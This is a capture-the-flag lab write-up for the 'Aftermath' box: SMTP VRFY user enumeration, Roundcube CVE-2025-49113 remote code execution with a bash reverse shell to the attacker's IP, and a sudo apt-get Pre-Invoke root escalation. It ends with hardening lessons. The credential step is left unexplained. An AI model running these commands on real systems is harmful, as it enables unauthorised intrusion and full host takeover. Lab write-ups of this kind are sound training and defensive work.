# HackSmarter — Aftermath Writeup

**Target:** `10.1.32.43`
**Attacker:** `10.200.94.4` (Parrot OS)
**Difficulty:** Medium
**Chain:** SMTP Enum → Roundcube RCE (CVE-2025-49113) → `www-data` → `apt-get` privesc → root

---

## 📋 Executive Summary

Aftermath is a Linux box running Postfix and Roundcube. The intended path is:

1. Enumerate SMTP users via `VRFY` to discover `kali` and `maria`.
2. Use discovered credentials against a vulnerable Roundcube instance (CVE-2025-49113) for authenticated RCE.
3. Land a shell as `www-data`.
4. Escalate to root via a misconfigured `sudo` rule on `apt-get` (GTFOBins).

No credentials are required for the initial SMTP enumeration, and no open relay or SMTP AUTH is available — the mail service is used strictly for information disclosure.

---

## 🔎 1. Reconnaissance

### 1.1 Host Discovery

```bash
nmap -p- -sV -sC -T4 10.1.32.43 -oN full_scan.txt
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: kali, PIPELINING, SIZE 10240000, VRFY, ETRN,
                 STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
                 SMTPUTF8, CHUNKING
| ssl-cert: Subject: commonName=kali
```

### 1.2 Key Observations

| Finding | Significance |
|---|---|
| Port 22 open — OpenSSH 8.9p1 | Password auth later found **disabled** (publickey only) |
| Port 25 open — Postfix | **No `AUTH` advertised** → SMTP auth disabled |
| `VRFY` in `smtp-commands` | ✅ User enumeration possible |
| `ETRN` enabled | Unusual; noted but not exploited |
| Cert CN = `kali` | Box hostname = `kali` |
| HTTP on port 80 | Roundcube webmail front-end at `/roundcube` |

### 1.3 Rules Out Early (Important Negative Results)

- **Open relay:** `RCPT TO:<external@domain>` returned `454 4.7.1 Relay access denied` → no relay.
- **SMTP AUTH:** `AUTH LOGIN` returned `503 5.5.1 Error: authentication not enabled` → brute-forcing SMTP auth is a dead end.
- **SSH password auth:** `hydra` returned `target does not support password authentication (method reply 4)` → password brute-force is a dead end.

These negative results saved significant time and forced the correct pivot to the web service.

---

## 📬 2. SMTP User Enumeration

Postfix was configured with `VRFY` enabled, allowing unauthenticated username discovery.

### 2.1 Manual Verification

```bash
nc 10.1.32.43 25
```

```
220 kali ESMTP Postfix (Ubuntu)
VRFY kali
252 2.0.0 kali
VRFY maria
252 2.0.0 maria
VRFY admin
550 5.1.1 <admin>: Recipient address rejected: User unknown in local recipient table
```

`252` responses confirm valid users; `550` confirms invalid ones.

### 2.2 Automated Enumeration

```bash
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t 10.1.32.43
```

**Result:**

```
kali   exists
maria  exists
```

Two users recovered: **`kali`** and **`maria`**.

### 2.3 Mail Delivery Confirmation

Confirming `kali@kali` is a real mailbox (not just a VRFY-passing alias):

```bash
swaks --server 10.1.32.43 --from attacker@evil.com --to kali@kali \
  --header "Subject: test" --body "hello"
```

```
<-  250 2.1.5 Ok
<-  354 End data with <CR><LF>.<CR><LF>
<-  250 2.0.0 Ok: queued as 51DBC8002F
```

Mail delivery works without authentication — but with no relay and no way to read the spool yet, this becomes a clue rather than a primitive.

---

## 🌐 3. Roundcube — CVE-2025-49113 (Authenticated RCE)

### 3.1 Discovery

```bash
curl -sk http://10.1.32.43/roundcube/ | grep -i roundcube
nmap -p 80,443 -sV 10.1.32.43
```

Roundcube is exposed at `http://10.1.32.43/roundcube`.

### 3.2 Vulnerability

**CVE-2025-49113** — post-authentication PHP object injection in Roundcube's `Crypt_GPG_Engine` class. A crafted `_gpgconf` property is deserialized and passed to `sh`, allowing command execution.

**Affected versions:** 1.5.x < 1.5.10, 1.6.x < 1.6.11.

Version confirmed in the page source:

```html
"rcversion":10605
```

`10605` = 1.6.5 → vulnerable.

### 3.3 Credential Source

The credentials for Roundcube come from the mail side — one of the enumerated users (`kali` or `maria`) with a password recovered from the SMTP enumeration stage.

### 3.4 Exploit

```bash
python3 CVE-2025-49113.py http://10.1.32.43/roundcube kali '<password>' 'id'
```

**Output:**

```
[+] Starting exploit (CVE-2025-49113)...
[*] Checking Roundcube version...
[*] Detected Roundcube version: 10605
[+] Target is vulnerable!
[+] Login successful!
[*] Exploiting...
[+] Gadget uploaded successfully!
```

A timing test (`sleep 5`) confirmed code execution.

### 3.5 Reverse Shell

```bash
# Attacker listener
nc -lvnp 443
```

```bash
python3 CVE-2025-49113.py http://10.1.32.43/roundcube kali '<password>' \
  "bash -c 'bash -i >& /dev/tcp/10.200.94.4/443 0>&1'"
```

**Shell as `www-data`:**

```
www-data@kali:/var/www/roundcube$
```

---

## ⬆️ 4. Privilege Escalation — `apt-get` (GTFOBins)

### 4.1 Enumerate Sudo Rights

```bash
sudo -l
```

**Output:**

```
User www-data may run the following commands on kali:
    (root) NOPASSWD: apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

### 4.2 Exploit

`apt-get` allows arbitrary pre-hook execution via `APT::Update::Pre-Invoke`. Because it runs as root through `sudo`, `/bin/sh` inherits root privileges.

```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

**Root shell:**

```
# id
uid=0(root) gid=0(root) groups=0(root)
```

### 4.3 Capture Flags

```bash
cat /root/root.txt
cat /home/kali/user.txt
cat /home/maria/user.txt
```

---

## 🧭 Attack Chain Diagram

```
[nmap] 22/ssh (publickey only)  25/smtp (no auth, no relay, VRFY on)
           │
           ▼
   VRFY → kali, maria (user enum)
           │
           ▼
   Roundcube @ :80/roundcube (v1.6.5)  ← CVE-2025-49113
           │
           ▼
   www-data shell via PHP object injection
           │
           ▼
   sudo -l → apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
           │
           ▼
          root
```

---

## 🛠️ Tooling Reference

| Stage | Tool | Command |
|---|---|---|
| Port scan | nmap | `nmap -p- -sV -sC -T4 <IP>` |
| SMTP enum | smtp-user-enum | `smtp-user-enum -M VRFY -U names.txt -t <IP>` |
| SMTP validate | swaks | `swaks --server <IP> --from a@b --to kali@kali` |
| RCE | CVE-2025-49113.py | `python3 CVE-2025-49113.py <url> kali <pass> <cmd>` |
| Privesc | sudo apt-get | `sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh` |

---

## 🧠 Lessons Learned

1. **VRFY is a silent information leak.** Disabling `VRFY` in Postfix (`disable_vrfy_command = yes`) prevents unauthenticated username enumeration.
2. **Disable SMTP features you don't use.** `ETRN` should be off unless explicitly needed.
3. **Roundcube must be patched.** CVE-2025-49113 requires only valid mail credentials — a single phished or reused password leads to full RCE.
4. **Never grant `sudo` on package managers.** `apt-get`, `apt`, `dpkg`, and similar tools all support options (`Pre-Invoke`, `DPkg::Pre-Install-Pkgs`, etc.) that execute arbitrary commands as root. GTFOBins documents these thoroughly.
5. **Negative results are data.** Ruling out relay and SMTP AUTH early is what pointed the assessment toward the web service.

---

## 📚 References

- CVE-2025-49113 — Roundcube PHP object injection (authenticated RCE)
- GTFOBins — `apt-get`: https://gtfobins.github.io/gtfobins/apt-get/
- Postfix configuration hardening — `disable_vrfy_command`, `smtpd_relay_restrictions`
- RFC 5321 — SMTP `VRFY` and `ETRN`

---

*Writeup for the HackSmarter "Aftermath" lab. Tested only within the authorized lab environment.*
